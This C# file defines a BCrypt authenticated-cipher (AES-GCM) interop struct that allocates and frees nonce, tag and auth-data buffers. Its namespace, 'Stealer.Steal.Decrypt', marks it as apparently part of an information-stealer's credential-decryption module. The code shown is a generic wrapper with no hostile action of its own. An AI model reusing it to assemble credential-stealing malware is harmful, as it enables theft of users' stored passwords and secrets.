using System;
using System.Runtime.InteropServices;

namespace Stealer.Steal.Decrypt;

public class BCrypt
{
	public struct BcryptAuthenticatedCipherModeInfo : IDisposable
	{
		public int CbSize;

		public int DwInfoVersion;

		private readonly IntPtr _pbNonce;

		private readonly int _cbNonce;

		private readonly IntPtr _pbAuthData;

		private readonly int _cbAuthData;

		private readonly IntPtr _pbTag;

		private readonly int _cbTag;

		private readonly IntPtr _pbMacContext;

		public int CbAad;

		public long CbData;

		public int DwFlags;

		public BcryptAuthenticatedCipherModeInfo(byte[] iv, byte[] aad, byte[] tag)
		{
			this = default(BcryptAuthenticatedCipherModeInfo);
			DwInfoVersion = 1;
			CbSize = Marshal.SizeOf(typeof(BcryptAuthenticatedCipherModeInfo));
			if (iv != null)
			{
				_cbNonce = iv.Length;
				_pbNonce = Marshal.AllocHGlobal(_cbNonce);
				Marshal.Copy(iv, 0, _pbNonce, _cbNonce);
			}
			if (aad != null)
			{
				_cbAuthData = aad.Length;
				_pbAuthData = Marshal.AllocHGlobal(_cbAuthData);
				Marshal.Copy(aad, 0, _pbAuthData, _cbAuthData);
			}
			if (tag != null)
			{
				_cbTag = tag.Length;
				_pbTag = Marshal.AllocHGlobal(_cbTag);
				Marshal.Copy(tag, 0, _pbTag, _cbTag);
				int cb = tag.Length;
				_pbMacContext = Marshal.AllocHGlobal(cb);
			}
		}

		public void Dispose()
		{
			if (_pbNonce != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(_pbNonce);
			}
			if (_pbTag != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(_pbTag);
			}
			if (_pbAuthData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(_pbAuthData);
			}
			if (_pbMacContext != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(_pbMacContext);
			}
		}
	}
}
